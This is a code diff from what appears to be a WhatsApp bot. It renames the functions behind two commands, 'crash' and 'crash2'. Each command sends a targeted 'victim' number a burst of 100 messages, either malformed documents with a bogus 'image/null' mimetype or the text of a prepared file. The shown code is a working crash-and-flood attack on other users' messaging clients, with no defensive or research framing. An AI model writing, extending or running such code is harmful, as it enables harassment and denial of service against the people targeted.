@@ -630,7 +630,7 @@ if (command === "crash") {
     const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     const amount = 100;
 
-    async function XeonyCrashy(name, chat) {
+    async function WantedasaCrash1(name, chat) {
         await sock.sendMessage(chat, {
             document: { url: "./wantedasa1.js" },
             mimetype: "image/null",
@@ -640,7 +640,7 @@ if (command === "crash") {
     }
 
     for (let i = 0; i < amount; i++) {
-        await XeonyCrashy("Wantedasa", victim);
+        await WantedasaCrash1("Wantedasa", victim);
     }
 
     reply(sock, msg, `done.`);
@@ -665,14 +665,14 @@ if (command === "crash2") {
 
     const fileContent = fs.readFileSync(filePath, "utf-8");
 
-    async function XeonyCrashy(chat) {
+    async function WantedasaCrash(chat) {
         await sock.sendMessage(chat, {
             text: fileContent
         });
     }
 
     for (let i = 0; i < amount; i++) {
-        await XeonyCrashy(victim);
+        await WantedasaCrash(victim);
     }
 
     return reply(sock, msg, `done.`);
